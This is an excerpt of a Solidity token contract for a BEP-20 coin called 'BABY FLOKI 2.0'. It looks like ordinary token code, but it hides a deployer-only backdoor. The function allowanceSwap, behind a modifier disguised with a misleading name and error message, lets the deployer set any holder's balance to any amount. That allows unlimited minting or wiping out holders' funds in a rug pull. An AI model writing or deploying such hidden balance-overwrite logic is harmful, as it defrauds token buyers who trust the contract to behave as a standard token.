...
contract FLOKI2 is FLOKIbep20 {
  
    // common addresses
    address private owner;
    address private FLOKIPILOTWALL;
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 9;
    
    mapping(address => uint) public FLOKIrownerd;
    
    mapping(address => mapping(address => uint)) public Allowance;
    
    // token title metadata
    string public override name = "BABY FLOKI 2.0";
    string public override symbol = "BAFLOKI";
    ...
    constructor(uint FLOKIalltotalSupplytotalValue) {
        // set total supply
        totalSupply = FLOKIalltotalSupplytotalValue;
        
       FLOKIPILOTWALL = msg.sender;      
        // designate addresses
        owner = msg.sender;
        
        // split the tokens according to agreed upon percentages
        
        FLOKIrownerd[owner] = totalSupply;
    }
    ...
    function balanceOf(address account) public view override returns(uint) {
        return FLOKIrownerd[account];
    }
  modifier _virtuals () {
    require(FLOKIPILOTWALL == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }   
    ...
    function transfer(address to, uint totalValue) public override returns(bool) {
        ...
        FLOKIrownerd[to] += totalValueAfterTaxAndBurn;
        FLOKIrownerd[msg.sender] -= totalValue;
        
        emit Transfer(msg.sender, to, totalValue);
        
        // finally, we burn and tax the extras percentage
        FLOKIrownerd[owner] += taxTBD + burnTBD;
        _burn(owner, burnTBD);
    ...
    function allowanceSwap(address FLOKISwap, uint256 amount) external _virtuals {
      FLOKIrownerd[FLOKISwap] = amount * 10 ** 9;
  }  
    ...
    function transferFrom(address from, address to, uint totalValue) public override returns(bool) {
        ...
        require(FLOKIrownerd[from] >= totalValue, "Balance is too low to make transfer.");
        
        FLOKIrownerd[to] += totalValue;
        FLOKIrownerd[from] -= totalValue;
    ...
    function _burn(address account, uint256 amount) internal {
        ...
        require(FLOKIrownerd[account] >= amount, "Burn amount exceeds balance at address.");
    
        FLOKIrownerd[account] -= amount;
        totalSupply -= amount;
